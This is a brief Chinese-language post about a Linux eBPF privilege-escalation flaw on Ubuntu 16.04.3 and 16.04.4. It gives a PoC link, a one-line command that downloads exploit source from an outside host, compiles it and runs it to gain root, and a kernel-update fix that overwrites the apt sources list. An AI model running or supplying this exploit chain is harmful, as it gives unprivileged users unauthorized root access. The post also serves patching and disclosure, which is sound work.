PoC：https://t.co/vXPrr33S7B

前提条件：

未设置unprivileged_bpf_disabled sysctl ，非特权用户就可以利用此漏洞。


已知可以测试版本：

ubuntu 16.04.4

ubuntu 16.04.3


在非root机器上可以执行：wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned




解决方案：

echo "deb http://archive.ubuntu.com/ubuntu/  xenial-proposed restricted main multiverse universe" > /etc/apt/sources.list && apt update && apt install linux-image-4.4.0-117-generic && reboot


更新内核后需要重新才能生效


再次执行会提示无权限操作！
